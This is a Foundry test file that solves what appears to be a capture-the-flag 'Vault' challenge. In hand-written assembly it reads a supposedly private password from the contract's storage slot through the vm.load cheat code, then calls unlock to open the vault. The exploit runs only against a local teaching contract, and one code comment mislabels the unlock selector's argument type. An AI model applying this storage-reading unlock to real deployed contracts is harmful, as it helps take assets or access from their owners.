pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";
import "../src/Vault.sol";

contract ASMVault is Test {
    using stdStorage for StdStorage;
    StdStorage private sdstore;

    address public attacker = address(420);
    Vault public target;

    function setUp() public {
        target = new Vault("lets assume I didn't know this");
    }

    function testASMVault() public {
        // address internal constant VM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
        address vmAddr = address(vm);
        console2.log(vmAddr);
        bytes4 load = VmSafe.load.selector;

        assembly {
            // we can't directly access private storage inside the EVM
            // but we can fetch it using any number of utilities for accessing storage slots.
            // In our case, we are making use of foundry's vm.load function, which we CAN
            // use inside our assembly call

            let ptr := mload(0x40)

            // external selector is already encoded as bytes4
            mstore(ptr, load)

            // store our address that we want to load storage for
            mstore(add(ptr, 0x4), sload(target.slot))

            // password in vault is in storage slot 1
            mstore(add(ptr, 0x24), 1)

            // call the VM
            // TODO: is there a way to fetch the VM address in ASM
            let success := call(
                gas(),
                vmAddr,
                0,
                ptr,
                0x44,
                add(ptr, 0x44), // copy the result into memory after our existing data
                0x20 // bytes32 result - we are assuming the data fits into a bytes32 slot
            )

            if iszero(success) {
                revert(0, 0)
            }

            // move our pointer past the input data and grab the pwd
            ptr := add(ptr, 0x44)
            let fetched_pwd := mload(ptr)

            // now we can setup the call to vault, move the pointer to an empty place in memory
            ptr := add(ptr, 0x20)

            // make a call to the target using the function selector for "unlock(address)"
            // function selector, padded correctly
            mstore(ptr, shl(0xe0, 0xec9b5b3a))
            mstore(add(ptr, 0x4), fetched_pwd)

            // call the target
            success := call(gas(), sload(target.slot), 0, ptr, 0x24, 0, 0)

            if iszero(success) {
                revert(0, 0)
            }
        }

        assertEq(target.locked(), false);
    }
}
